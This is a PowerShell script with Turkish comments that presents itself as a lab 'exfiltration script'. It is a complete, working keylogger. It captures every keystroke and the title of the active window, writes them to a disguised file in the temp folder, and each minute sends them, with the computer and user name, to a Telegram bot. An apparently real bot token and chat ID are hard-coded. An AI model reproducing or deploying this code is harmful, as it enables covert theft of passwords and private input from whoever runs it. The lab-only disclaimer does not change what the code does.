# =========================================================================================
# Hardware Security Research Lab - Exfiltration Script (v4.0 - Telegram Edition)
# Sadece laboratuvar ortamında, fiziksel güvenlik testleri simülasyonu için tasarlanmıştır.
# =========================================================================================

$ErrorActionPreference = "SilentlyContinue"

# --- TELEGRAM AYARLARI ---
# @BotFather'dan aldığın API Token ve @userinfobot'tan aldığın Chat ID'ni buraya yaz.
$botToken = "8264639405:AAG5RfYVShmQU4zqWNAS9-FSsOIa9CSuaXY"
$chatID   = "7177155107"
$logPath  = "$env:TEMP\win_system_temp_data.log"
$interval = 1 # Dakika bazında gönderim aralığı
# -------------------------

# 1. Gerekli kütüphaneleri yükle (Hata giderme dahil)
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

if (-not ([System.Management.Automation.PSTypeName]'Win32Native').Type) {
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.ReferencedAssemblies.AddRange(@("System.Windows.Forms.dll", "System.dll"))
    $source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;
    public class Win32Native {
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
    }
"@
    Add-Type -TypeDefinition $source -CompilerParameters $cp
}

$lastWindow = ""
$prevState = @{}
$tgBuffer = ""
$lastExfil = Get-Date

# 2. Telegram Gönderim Fonksiyonu
function Send-TelegramMessage($message) {
    if ([string]::IsNullOrWhiteSpace($message) -or $botToken -like "YOUR_*") { return }

    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $pcInfo = "🖥️ **Lab:** $env:COMPUTERNAME | 👤 **User:** $env:USERNAME"

    # Telegram mesaj sınırı 4096 karakterdir.
    if ($message.Length -gt 3800) { $message = $message.Substring(0, 3800) + "... [Truncated]" }

    $fullMsg = "$pcInfo`n`n`n<pre>$message</pre>"
    $payload = @{
        chat_id = $chatID
        text = $fullMsg
        parse_mode = "HTML"
    }

    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $payload
    } catch {}
}

Write-Host "[!] Telegram Lab Modu Aktif. Veriler anlık olarak $logPath adresine kaydediliyor." -ForegroundColor Yellow

# 3. Ana Döngü
while ($true) {
    Start-Sleep -Milliseconds 20

    # Pencere Takibi
    $currentHWnd = [Win32Native]::GetForegroundWindow()
    $windowTitle = New-Object System.Text.StringBuilder 256
    [Win32Native]::GetWindowText($currentHWnd, $windowTitle, 256) | Out-Null
    $titleStr = $windowTitle.ToString()

    if ($titleStr -and ($titleStr -ne $lastWindow)) {
        $lastWindow = $titleStr
        $header = "`r`n`r`n[TARGET: $lastWindow] - [$((Get-Date).ToString('HH:mm:ss'))]`r`n" + ("=" * 20) + "`r`n"
        Add-Content -Path $logPath -Value $header -NoNewline
        $tgBuffer += $header
    }

    # Klavye Tarama
    $keyState = New-Object byte[] 256
    [Win32Native]::GetKeyboardState($keyState) | Out-Null

    for ($i = 8; $i -le 254; $i++) {
        $isPressed = ([Win32Native]::GetAsyncKeyState($i) -band 0x8000) -ne 0
        if ($isPressed -and -not $prevState[$i]) {
            $sb = New-Object System.Text.StringBuilder 5
            $scanCode = [Win32Native]::MapVirtualKey($i, 0)
            $res = [Win32Native]::ToUnicode($i, $scanCode, $keyState, $sb, $sb.Capacity, 0)

            $out = if ($res -gt 0) { $sb.ToString() } else {
                switch ([System.Windows.Forms.Keys]$i) {
                    "Enter" { "[ENTER]`n" } "Back" { "[BS]" } "Space" { " " } "Tab" { "[TAB]" }
                }
            }

            if ($out) {
                # ANLIK YEREL KAYIT (TEMP KLASÖRÜNE)
                Add-Content -Path $logPath -Value $out -NoNewline
                $tgBuffer += $out
            }
        }
        $prevState[$i] = $isPressed
    }

    # 4. Dakikalık Telegram Sızdırması
    if (((Get-Date) - $lastExfil).TotalMinutes -ge $interval) {
        if ($tgBuffer.Trim() -ne "") {
            Send-TelegramMessage $tgBuffer
            $tgBuffer = ""
            $lastExfil = Get-Date
        }
    }
}
